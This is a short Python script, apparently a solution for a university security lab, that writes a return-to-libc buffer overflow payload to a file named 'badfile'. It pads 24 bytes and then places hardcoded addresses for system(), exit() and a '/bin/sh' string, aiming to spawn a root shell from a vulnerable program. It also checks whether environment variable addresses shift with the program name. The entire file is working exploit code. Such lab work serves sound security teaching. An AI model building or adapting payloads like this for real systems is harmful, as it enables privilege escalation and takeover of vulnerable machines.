#!/usr/bin/env python3
import sys

content = bytearray(0xaa for i in range(300))

system_addr = 0xb7e42da0
exit_addr = 0xb7e369d0
sh_addr = 0xbffffdbd    # Same rootshell address as before

offset = 24

content[0:offset] = b'A' * offset
content[offset:offset+4] = (system_addr).to_bytes(4, byteorder='little')
content[offset+4:offset+8] = (exit_addr).to_bytes(4, byteorder='little')
content[offset+8:offset+12] = (sh_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)

print("Task 3 Variation 2: Return-to-libc Attack with Different Filename")
print("Purpose: Test if environment variable addresses change with different program names")
print("Using same payload as original attack")